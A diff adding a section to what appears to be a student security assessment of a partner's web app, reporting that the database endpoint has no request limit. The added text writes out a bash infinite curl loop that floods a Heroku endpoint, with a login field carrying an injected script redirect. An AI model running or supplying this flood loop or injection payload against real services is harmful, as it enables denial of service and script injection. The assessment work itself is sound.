@@ -43,17 +43,18 @@
 
 
 
+	<h2> 2. No data limit: </h2>
+	<p> As stated in the abstract, I was able curl to my partner's database an arbitrary number of times using a bash shell script. With a simple do while loop, I was able to flood my partner's database. With no limits, this makes it susceptible to DDOS attacks. </p> 
 
+	<p>.sh file contents:</p>
+	<p> <i> while true </i> </p>
+	<p> <i> do </i> </p>
+	<p> <i> curl --data "login=script window.location='https://www.youtube.com';/script&lat=0&lng=0" https://pure-river-81762.herokuapp.com/sendLocation </i> </p>
+	<p> <i> done </i> </p>
 
-
-
-
-
-
-
-
-
-
+	<p> Executed script: </p>
+	<video width="300" height="400" controls>
+  	<source src="databaseflood.mov" type="video/mp4"> </video>
 
 
 
